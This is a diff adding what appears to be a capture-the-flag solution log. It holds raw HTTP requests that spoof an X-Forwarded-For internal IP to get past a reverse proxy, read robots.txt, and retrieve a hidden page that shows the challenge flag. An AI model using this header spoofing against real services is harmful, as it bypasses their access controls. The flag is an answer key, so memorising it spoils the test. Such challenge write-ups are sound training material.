@@ -1,0 +1,81 @@
+https://000990aa23-web01-reverseproxynightmare.dbhchallenge.net/
+
+GET / HTTP/1.1
+Host: 000990aa23-web01-reverseproxynightmare.dbhchallenge.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+X-Forwarded-For: 172.16.0.1
+Connection: close
+
+HTTP/1.1 200 OK
+Server: nginx/1.21.6
+Date: Mon, 08 Aug 2022 15:52:21 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/8.1.6
+Content-Length: 375
+
+            <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Error</title>
+    <link rel="stylesheet" href="css/bootstrap.css">
+</head>
+<body>
+<div class="container">
+    <div class="hero-unit">
+        <h1>Willkommen</h1>
+        <p>Der interne Bereich befindet sich gerade im Aufbau.</p>
+    </div>
+</div>
+</body>
+</html>
+
+    
+##########################################################################################
+GET robots.txt
+
+HTTP/1.1 200 OK
+Server: nginx/1.21.6
+Date: Mon, 08 Aug 2022 15:54:35 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/8.1.6
+Content-Length: 59
+
+            User-Agent: *
+Disallow: /s3cur3Fl4g.html
+    
+##########################################################################################
+GET /s3cur3Fl4g.html
+
+HTTP/1.1 200 OK
+Server: nginx/1.21.6
+Date: Mon, 08 Aug 2022 15:55:41 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/8.1.6
+Content-Length: 360
+
+            <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Flag</title>
+    <link rel="stylesheet" href="css/bootstrap.css">
+</head>
+<body>
+<div class="container">
+    <div class="hero-unit">
+        <h1>Flag</h1>
+       <code>DBH{Pr0xy_1s_aFr13nd_sdaf98asdf89asdf}</code>
+    </div>
+</div>
+</body>
+</html>
+
+    
